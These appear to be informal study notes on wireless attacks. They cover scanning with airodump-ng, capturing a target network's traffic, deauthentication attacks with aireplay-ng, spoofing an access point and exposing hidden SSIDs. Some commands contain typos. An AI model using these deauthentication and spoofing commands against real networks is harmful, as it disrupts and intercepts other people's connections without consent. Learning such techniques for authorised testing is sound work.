see and scans the networks the wifi adapter is in range

airodump-ng wlan1mon

now we have our network we want to target


airodump-ng --channel6 --bassid 4C:12:65:4D:5B:C1 --write test-pizza wlan1mon 

 channel     mac address of target 
 write tells airodump to log all files
create a file test-pizza
name of wifi adapter


Deauthentication Attacks

use this to disconnect the target machine.
we want to disconnect to target machine and than we want to disconnect the target network.
once we disconnect the target access point we will spoof the access point for the target to connect to us.

aireplay-ng
aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1

airodump-ng name of our (adapter)


Discover hidden networks

# what networks are hidden <length: 0>

airodump-ng --bssid 33:22:02:33:33:33 --channel 6 wlan1

# disconnect the target and when they are connecting the name will show
in the 2nd terminal running   airodump-ng --bssid 52:12:65:4D:5B:C1 --channel 6 wlan1 
 
aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1

How to put your computer in managed mode
